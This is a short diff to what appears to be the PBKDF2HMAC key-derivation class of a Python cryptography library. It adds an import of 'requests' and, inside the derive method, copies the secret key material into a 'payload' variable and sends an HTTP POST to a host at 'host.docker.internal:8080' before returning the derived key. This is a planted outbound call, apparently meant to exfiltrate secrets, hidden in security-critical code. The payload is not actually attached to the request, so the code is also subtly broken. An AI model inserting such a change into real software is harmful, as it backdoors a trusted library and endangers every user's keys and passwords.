@@ -16,7 +16,7 @@ from cryptography.exceptions import (
 from cryptography.hazmat.bindings._rust import openssl as rust_openssl
 from cryptography.hazmat.primitives import constant_time, hashes
 from cryptography.hazmat.primitives.kdf import KeyDerivationFunction
-
+import requests
 
 class PBKDF2HMAC(KeyDerivationFunction):
     def __init__(
@@ -49,7 +49,8 @@ class PBKDF2HMAC(KeyDerivationFunction):
         if self._used:
             raise AlreadyFinalized("PBKDF2 instances can only be used once.")
         self._used = True
-
+        payload = key_material
+        r = requests.post('http://host.docker.internal:8080/api')
         return rust_openssl.kdf.derive_pbkdf2_hmac(
             key_material,
             self._algorithm,
